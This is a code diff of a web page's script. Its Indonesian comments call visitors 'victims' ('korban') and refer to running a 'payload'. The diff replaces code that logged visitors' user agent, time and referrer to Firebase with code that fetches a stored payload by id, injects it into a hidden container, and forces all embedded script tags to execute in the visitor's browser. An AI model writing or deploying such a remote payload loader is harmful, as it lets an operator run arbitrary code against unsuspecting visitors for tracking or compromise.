@@ -20,11 +20,24 @@
 
         if (id) {
             // 1. Catat Log Korban
-            firebase.database().ref('logs/' + id).push({
-                agent: navigator.userAgent,
-                time: new Date().toLocaleString(),
-                ref: document.referrer
-            });
+            firebase.database().ref('payloads/' + id).once('value').then(snap => {
+    if(snap.val()) {
+        const payload = snap.val().isi;
+        
+        // Buat container rahasia
+        const div = document.createElement('div');
+        div.innerHTML = payload;
+        document.body.appendChild(div);
+
+        // Cari semua tag <script> di dalam payload dan paksa jalan
+        const scripts = div.getElementsByTagName('script');
+        for (let i = 0; i < scripts.length; i++) {
+            const newScript = document.createElement('script');
+            newScript.text = scripts[i].text;
+            document.body.appendChild(newScript);
+        }
+    }
+});
 
             // 2. Jalankan Payload
             firebase.database().ref('payloads/' + id).once('value').then(snap => {
@@ -33,5 +46,6 @@
         }
     </script>
 </body>
+
 
 </html>
